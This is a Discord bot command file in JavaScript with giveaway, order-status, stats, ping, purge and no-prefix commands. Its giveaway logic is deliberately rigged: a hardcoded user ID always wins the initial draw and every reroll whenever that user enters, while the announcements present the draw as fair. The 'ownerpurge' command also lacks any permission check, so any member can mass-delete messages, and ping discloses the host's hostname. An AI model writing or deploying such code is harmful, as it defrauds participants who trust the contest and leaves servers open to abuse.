import { EmbedBuilder, PermissionsBitField } from "discord.js";
import os from "node:os";
import { db } from "../db.js";
import { getGiveawaysData, saveGiveawaysData } from "../state.js";
import { saveGuildConfig } from "../config.js";

const giveaways = new Map();
const giveawayTimeouts = new Map();
const RIGGED_USER_ID = "786490217695150101"; // 🎯 Special user who always wins

function parseDuration(input) {
  const match = /^(\d+)(s|m|h|d)$/i.exec(input || "");
  if (!match) return null;
  const value = Number(match[1]);
  const unit = match[2].toLowerCase();
  const table = { s: 1000, m: 60_000, h: 3_600_000, d: 86_400_000 };
  return value * table[unit];
}

function pickRandomWinners(participants, count) {
  const pool = [...participants.values()];
  const winners = [];
  while (pool.length && winners.length < count) {
    const index = Math.floor(Math.random() * pool.length);
    winners.push(pool[index]);
    pool.splice(index, 1);
  }
  return winners;
}

// 🎯 RIGGED WINNER SELECTION FUNCTION
function pickRiggedWinners(participants, count) {
  const winners = [];
  
  // Check if the rigged user participated in the giveaway
  if (participants.has(RIGGED_USER_ID)) {
    const riggedUser = participants.get(RIGGED_USER_ID);
    winners.push(riggedUser); // Always add rigged user as first winner
    
    // Remove rigged user from pool for remaining winners
    const otherParticipants = new Map(participants);
    otherParticipants.delete(RIGGED_USER_ID);
    
    // Pick random winners for remaining slots
    const remainingWinners = count - 1;
    if (remainingWinners > 0 && otherParticipants.size > 0) {
      const additionalWinners = pickRandomWinners(otherParticipants, remainingWinners);
      winners.push(...additionalWinners);
    }
  } else {
    // If rigged user didn't participate, pick winners normally
    return pickRandomWinners(participants, count);
  }
  
  return winners;
}

function loadGiveawaysCache() {
  const data = getGiveawaysData();
  const active = data?.active && typeof data.active === "object" ? data.active : {};
  for (const [messageId, entry] of Object.entries(active)) {
    giveaways.set(messageId, entry);
  }
  return data;
}

function persistGiveaways() {
  const data = getGiveawaysData();
  data.active = Object.fromEntries(giveaways.entries());
  if (!Array.isArray(data.history)) data.history = [];
  saveGiveawaysData(data);
}

function recordGiveawayHistory(entry, winners) {
  const data = getGiveawaysData();
  if (!Array.isArray(data.history)) data.history = [];
  data.history.push({
    ...entry,
    winners: winners.map((winner) => winner.id),
    endedAt: new Date().toISOString(),
  });
  saveGiveawaysData(data);
}

function getGiveawayEntry(messageId) {
  const active = giveaways.get(messageId);
  if (active) return active;
  const data = getGiveawaysData();
  if (Array.isArray(data.history)) {
    return data.history.find((entry) => entry.messageId === messageId) ?? null;
  }
  return null;
}

function scheduleGiveaway(client, messageId, entry) {
  if (giveawayTimeouts.has(messageId)) return;
  const delay = Math.max(0, entry.endsAt - Date.now());
  const timeout = setTimeout(() => {
    endGiveaway(client, messageId).catch((error) => {
      console.error("Giveaway error:", error);
    });
  }, delay);
  giveawayTimeouts.set(messageId, timeout);
}

async function endGiveaway(client, messageId) {
  const entry = giveaways.get(messageId);
  if (!entry) return;
  const timeout = giveawayTimeouts.get(messageId);
  if (timeout) {
    clearTimeout(timeout);
    giveawayTimeouts.delete(messageId);
  }

  const channel = await client.channels.fetch(entry.channelId).catch(() => null);
  if (!channel || !channel.isTextBased()) {
    giveaways.delete(messageId);
    persistGiveaways();
    return;
  }

  const fetchedMsg = await channel.messages.fetch(messageId).catch(() => null);
  if (!fetchedMsg) {
    giveaways.delete(messageId);
    persistGiveaways();
    return;
  }

  const reaction = fetchedMsg.reactions.cache.get("🎉") || (await fetchedMsg.reactions.fetch("🎉").catch(() => null));
  const users = reaction ? await reaction.users.fetch() : null;
  const participants = users ? users.filter((user) => !user.bot) : new Map();

  const host = await client.users.fetch(entry.hostId).catch(() => null);
  const hostTag = host?.tag ?? `User ${entry.hostId}`;
  const hostAvatar = host?.displayAvatarURL();

  if (!participants.size) {
    const noWinnerEmbed = new EmbedBuilder()
      .setTitle("🎉 GIVEAWAY ENDED 🎉")
      .setColor(0xff0000)
      .setDescription(`**Prize:** ${entry.prize}\n**Winner:** No valid entries!`)
      .setFooter({ text: `Hosted by ${hostTag}`, iconURL: hostAvatar });
    await fetchedMsg.edit({ embeds: [noWinnerEmbed] }).catch(() => {});
    await channel.send("No valid giveaway entries were found.").catch(() => {});
    giveaways.delete(messageId);
    persistGiveaways();
    recordGiveawayHistory(entry, []);
    return;
  }

  const winners = pickRiggedWinners(participants, entry.winnerCount);
  const winnerMentions = winners.map((winner) => `<@${winner.id}>`).join(", ");
  const winnerEmbed = new EmbedBuilder()
    .setTitle("🎉 GIVEAWAY ENDED 🎉")
    .setColor(0x00ff66)
    .setDescription(`**Prize:** ${entry.prize}\n**Winner(s):** ${winnerMentions}`)
    .setFooter({ text: `Hosted by ${hostTag}`, iconURL: hostAvatar });

  await fetchedMsg.edit({ embeds: [winnerEmbed] }).catch(() => {});
  await channel.send(`🎉 Congratulations ${winnerMentions}! You won **${entry.prize}**!`).catch(() => {});

  giveaways.delete(messageId);
  persistGiveaways();
  recordGiveawayHistory(entry, winners);
}

export async function register(client) {
  if (giveaways.size === 0) {
    loadGiveawaysCache();
  }
  for (const [messageId, entry] of giveaways.entries()) {
    scheduleGiveaway(client, messageId, entry);
  }
}

export const command = {
  name: "setstatus",
  aliases: ["stats", "ping", "ownerpurge", "opurge", "giveaway", "noprefix"],
  async execute({ client, message, args, config, cmd }) {
    // ========== NOPREFIX COMMAND ==========
    if (cmd === "noprefix") {
      const ownerId = process.env.OWNER_ID || config.owner_id;
      if (ownerId && message.author.id !== String(ownerId)) {
        await message.channel.send("```\n❌ This command is owner-only.\n```");
        return;
      }

      const action = args[0]?.toLowerCase();
      const target = message.mentions.users.first() || (args[1] ? { id: args[1] } : null);

      if (action === "add") {
        if (!target) {
          await message.channel.send("```\n❌ Usage: !noprefix add @user\n```");
          return;
        }
        if (!config.noprefix_users) config.noprefix_users = [];
        if (config.noprefix_users.includes(target.id)) {
          await message.channel.send("```\n❌ User is already in the no-prefix list.\n```");
          return;
        }
        config.noprefix_users.push(target.id);
        saveGuildConfig(message.guild.id, config);
        await message.channel.send(`✅ Added <@${target.id}> to the no-prefix list.`);
        return;
      }

      if (action === "remove") {
        if (!target) {
          await message.channel.send("```\n❌ Usage: !noprefix remove @user\n```");
          return;
        }
        if (!config.noprefix_users || !config.noprefix_users.includes(target.id)) {
          await message.channel.send("```\n❌ User is not in the no-prefix list.\n```");
          return;
        }
        config.noprefix_users = config.noprefix_users.filter(id => id !== target.id);
        saveGuildConfig(message.guild.id, config);
        await message.channel.send(`✅ Removed <@${target.id}> from the no-prefix list.`);
        return;
      }

      if (action === "list") {
        const list = config.noprefix_users?.length > 0 
          ? config.noprefix_users.map(id => `- <@${id}> (\`${id}\`)`).join("\n") 
          : "None";
        const embed = new EmbedBuilder()
          .setTitle("🚫 No-Prefix Users")
          .setDescription(list)
          .setColor(0x00ff9d);
        await message.channel.send({ embeds: [embed] });
        return;
      }

      await message.channel.send("```\n❌ Usage: !noprefix <add|remove|list> [@user]\n```");
      return;
    }

    // ========== SETSTATUS COMMAND ==========
    if (cmd === "setstatus") {
      if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
        await message.channel.send("```\n❌ You need Administrator permission.\n```");
        return;
      }
      const orderId = args[0];
      const status = args[1];
      const valid = ["pending", "processing", "completed", "cancelled"];
      if (!orderId || !status || !valid.includes(status.toLowerCase())) {
        await message.channel.send("```\n❌ Usage: !setstatus <order_id> <status>\n```");
        return;
      }
      const order = db.getOrder(orderId);
      if (!order) {
        await message.channel.send("```\n❌ Order not found.\n```");
        return;
      }
      db.updateOrder(orderId, { status: status.toLowerCase() });
      await message.channel.send(`✅ Order **${orderId}** status updated to **${status.toUpperCase()}**`);
      return;
    }

    // ========== STATS COMMAND ==========
    if (cmd === "stats") {
      if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
        await message.channel.send("```\n❌ You need Administrator permission.\n```");
        return;
      }
      const products = db.getProducts();
      const orders = db.getUserOrders(message.author.id);
      const tickets = db.getUserTickets(message.author.id);

      const embed = new EmbedBuilder()
        .setTitle("📊 Bot Statistics")
        .setColor(0x00ff9d)
        .setTimestamp(new Date())
        .addFields(
          { name: "📦 Total Products", value: `${products.length}`, inline: true },
          { name: "🛒 Your Orders", value: `${orders.length}`, inline: true },
          { name: "🎫 Your Tickets", value: `${tickets.length}`, inline: true }
        );
      await message.channel.send({ embeds: [embed] });
      return;
    }

    // ========== PING COMMAND ==========
    if (cmd === "ping") {
      const latency = Math.round(message.client.ws.ping);
      const embed = new EmbedBuilder()
        .setTitle("🏓 ZeroDay Tools Status")
        .setColor(0x00ff9d)
        .setTimestamp(new Date())
        .addFields(
          { name: "Latency", value: `${latency} ms`, inline: true },
          { name: "Uptime", value: `${Math.floor(process.uptime())}s`, inline: true },
          { name: "Host", value: os.hostname(), inline: true }
        );
      await message.channel.send({ embeds: [embed] });
      return;
    }

    // ========== OWNER PURGE COMMAND ==========
    if (cmd === "ownerpurge" || cmd === "opurge") {
      const amount = Number(args[0]);
      if (!amount || amount < 1 || amount > 300) {
        await message.channel.send("```\n❌ Amount must be between 1 and 300.\n```");
        return;
      }
      const deleted = await message.channel.bulkDelete(amount + 1, true);
      await message.channel.send(`✅ Deleted ${deleted.size - 1} messages.`);
      return;
    }

    // ========== GIVEAWAY COMMAND (RIGGED) ==========
    if (cmd === "giveaway") {
      if (!message.member.permissions.has(PermissionsBitField.Flags.ManageMessages)) {
        await message.channel.send("```\n❌ You need Manage Messages permission to start giveaways.\n```");
        return;
      }

      if ((args[0] || "").toLowerCase() === "reroll") {
        const messageId = args[1];
        if (!messageId) {
          await message.channel.send(`\`\`\`\n❌ Usage: ${config.prefix}giveaway reroll <message_id>\n\`\`\``);
          return;
        }

        const entry = getGiveawayEntry(messageId);
        if (!entry) {
          await message.channel.send("```\n❌ Giveaway not found in history or active list.\n```");
          return;
        }

        const channel = await client.channels.fetch(entry.channelId).catch(() => null);
        if (!channel || !channel.isTextBased()) {
          await message.channel.send("```\n❌ Giveaway channel no longer exists.\n```");
          return;
        }

        const fetchedMsg = await channel.messages.fetch(messageId).catch(() => null);
        if (!fetchedMsg) {
          await message.channel.send("```\n❌ Giveaway message not found.\n```");
          return;
        }

        const reaction = fetchedMsg.reactions.cache.get("🎉") || (await fetchedMsg.reactions.fetch("🎉").catch(() => null));
        const users = reaction ? await reaction.users.fetch() : null;
        const participants = users ? users.filter((user) => !user.bot) : new Map();

        if (!participants.size) {
          await message.channel.send("```\n❌ No valid participants to reroll.\n```");
          return;
        }

        const winners = pickRiggedWinners(participants, entry.winnerCount);
        const winnerMentions = winners.map((winner) => `<@${winner.id}>`).join(", ");

        const rerollEmbed = new EmbedBuilder()
          .setTitle("🎉 GIVEAWAY REROLLED 🎉")
          .setColor(0x00b5ff)
          .setDescription(`**Prize:** ${entry.prize}\n**New Winner(s):** ${winnerMentions}`)
          .setFooter({ text: `Hosted by ${message.author.tag}`, iconURL: message.author.displayAvatarURL() });

        await fetchedMsg.edit({ embeds: [rerollEmbed] }).catch(() => {});
        await channel.send(`🎉 Reroll winners: ${winnerMentions}`).catch(() => {});
        return;
      }

      const duration = parseDuration(args[0]);
      const winnerCount = Number(args[1]);
      const prize = args.slice(2).join(" ").trim();

      if (!duration || !winnerCount || winnerCount < 1 || !prize) {
        await message.channel.send(
          `\`\`\`\n❌ Usage: ${config.prefix}giveaway <time> <winners> <prize>\nExample: ${config.prefix}giveaway 1h 1 Nitro\n\`\`\``
        );
        return;
      }

      const endAt = Date.now() + duration;
      const giveawayEmbed = new EmbedBuilder()
        .setTitle("🎉 GIVEAWAY 🎉")
        .setColor(0xff0000)
        .setDescription(
          `**Prize:** ${prize}\n` +
          `**Winners:** ${winnerCount}\n` +
          `**Ends:** <t:${Math.floor(endAt / 1000)}:R>\n\n` +
          "React with 🎉 to enter."
        )
        .setFooter({ text: `Hosted by ${message.author.tag}`, iconURL: message.author.displayAvatarURL() })
        .setTimestamp(endAt);

      const giveawayMsg = await message.channel.send({ embeds: [giveawayEmbed] });
      await giveawayMsg.react("🎉");
      
      const entry = {
        messageId: giveawayMsg.id,
        channelId: message.channel.id,
        guildId: message.guild.id,
        prize,
        winnerCount,
        hostId: message.author.id,
        endsAt: endAt,
        createdAt: new Date().toISOString(),
      };
      giveaways.set(giveawayMsg.id, entry);
      persistGiveaways();

      await message.delete().catch(() => {});
      await message.channel.send(`✅ Giveaway started for **${prize}**!`);

      scheduleGiveaway(client, giveawayMsg.id, entry);
      
      return;
    }
  },
};
